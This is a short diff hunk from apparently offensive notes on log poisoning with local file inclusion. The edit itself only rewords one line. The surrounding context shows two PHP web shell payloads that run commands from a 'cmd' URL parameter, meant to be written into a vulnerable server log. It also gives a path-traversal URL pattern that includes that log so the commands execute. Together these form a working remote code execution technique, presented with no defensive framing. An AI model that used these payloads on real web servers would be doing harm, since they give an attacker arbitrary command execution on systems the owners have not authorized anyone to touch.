@@ -11,7 +11,7 @@ Finding the vulnerability log, then implement malicious code into this log and g
 <?php system($_GET['cmd']); ?>
 <?php echo system($_GET['cmd']); ?>
 
-After implementing, we could do below attack:
+After implementing, we could do below attack on web page or by curl:
 <URL>?../../../../../{vulnerability log path and name}
 
 
